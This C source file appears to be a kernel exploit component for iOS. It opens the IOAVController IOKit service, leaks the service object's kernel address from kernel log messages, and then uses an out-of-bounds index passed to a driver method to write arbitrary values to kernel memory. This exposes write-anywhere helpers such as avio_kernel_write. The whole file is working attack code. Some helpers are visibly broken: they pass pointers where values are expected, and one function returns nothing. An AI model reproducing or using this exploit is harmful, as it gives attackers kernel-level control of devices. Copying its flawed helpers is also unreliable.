#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <IOKit/IOKitLib.h>
#include <unistd.h>
#include <asl.h>
#include <syslog.h>

#include "avio.h"

// STR.W           R4, [R0,#0x98]
const int g_addr_offset = 0x98;

io_connect_t g_connection = 0;
// IOService object address
uint32_t g_ioservice_addr = 0;

void write_mem_from_av(uint32_t address, uint32_t value);

void close_av_device()
{
    if (g_connection != 0)
        IOServiceClose(g_connection);
}

io_connect_t open_av_device()
{
    CFMutableDictionaryRef matching;
    io_service_t service;
    kern_return_t kr;
    
    if (g_connection != 0)
        return g_connection;
    
    matching = IOServiceMatching("IOAVController");
    service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
    kr  = IOServiceOpen(service, mach_task_self(), 0, &g_connection);
    if(KERN_SUCCESS != kr)
    {
        syslog(LOG_ERR, "Open IOService fail: %x\n", kr);
        g_connection = 0;
        return 0;
    }
    
    return g_connection;
}

// we can only query asl as root :(
// but we could get log from console log in tools like xcode!
// so call set_av_ioservice_addr to set the address
uint32_t get_address_from_asl()
{
    aslmsg q, m;
    int i;
    const char *key, *val, *ptr, *ptr2;
    char addressData[256] = {};
    q = asl_new(ASL_TYPE_QUERY);
    asl_set_query(q, ASL_KEY_SENDER, "kernel", ASL_QUERY_OP_EQUAL);
    aslresponse r = asl_search(NULL, q);
    syslog(LOG_ERR, "aslmsg: %p aslresponse: %p ret: %d\n", q, r, errno);
    while (NULL != (m = aslresponse_next(r)))
    {
        for (i = 0; (NULL != (key = asl_key(m, i))); i++)
        {
            val = asl_get(m, key);
            syslog(LOG_ERR, "#%d: val = %s\n", i, val);
            ptr = strstr(val, "_setLogLevel:(");
            if (ptr != NULL)
            {
                syslog(LOG_ERR, "%s: %s\n", key, val);
                
                ptr = ptr + 14;
                ptr2 = ptr;
                
                while (*ptr2 != ')')
                    ptr2 ++;
                
                syslog(LOG_ERR, "length = %d\n", (ptr2 - ptr));
                strncpy(addressData, ptr, (ptr2 - ptr));
                goto out;
                
            }
            syslog(LOG_ERR, "%s: %s\n", key, val);
        }
    }
    
out:
    aslresponse_free(r);
    
    if (strlen(addressData) != 0)
    {
        return strtoul(addressData, NULL, 16);
    }
    
    return 0;
}

// hack here. if you are not root, please get address from console log first
void set_av_ioservice_addr(uint32_t addr)
{
    g_ioservice_addr = addr;
}

uint32_t get_av_ioservice_addr()
{
    uint64_t input = 0;
    int i;
    
    if (open_av_device() == 0)
        return 0;
    
    if (g_ioservice_addr != 0)
        return g_ioservice_addr;
    
    for (i = 0; i < 20; i++)
    {
        // produce some log to retrieve object address
        IOConnectCallMethod(g_connection, 0, (uint64_t *)&input, 1, 0, 0, NULL, NULL, NULL, NULL);
        sleep(1);
        g_ioservice_addr = get_address_from_asl();
        
        if (g_ioservice_addr != 0)
            break;
    }
    
    syslog(LOG_ERR, "ioservice object address is %p\n", (void *)g_ioservice_addr);
    
    return g_ioservice_addr;
}

void write_mem_from_av(uint32_t address, uint32_t value)
{
    uint64_t input[2];
    uint32_t koffset;
    uint64_t kaddr;
    
    if (address % 4 != 0)
    {
        return;
    }
    
    get_av_ioservice_addr();
    
    if (g_ioservice_addr == 0)
        return;
    
    koffset = (address - g_ioservice_addr) - g_addr_offset;
    koffset /= 4;
    kaddr = 0x80000000 + koffset;
    syslog(LOG_ERR, "IOService: 0x%x Address to write: 0x%x Offset: %llx Value: 0x%x\n",
           g_ioservice_addr, address, kaddr, value);
    
    input[0] = kaddr;
    input[1] = (uint64_t)value;
    
    IOConnectCallMethod(g_connection, 1, (uint64_t *)input, 2, 0, 0, NULL, NULL, NULL, NULL);
}

vm_address_t avio_kernel_get(vm_address_t address) {
    
}

void avio_kernel_set(vm_address_t address, void* value) {
    write_mem_from_av(address, value);
}
vm_size_t avio_kernel_read(vm_address_t addr, void* buffer, vm_size_t size)  {
    return 0;
}
vm_size_t avio_kernel_write(vm_address_t addr, void* buffer, vm_size_t size) {
    int i = 0;
    for(i = 0; i < size; i += 4) {
        avio_kernel_set(addr+i, buffer+i);
    }
    return 0;
}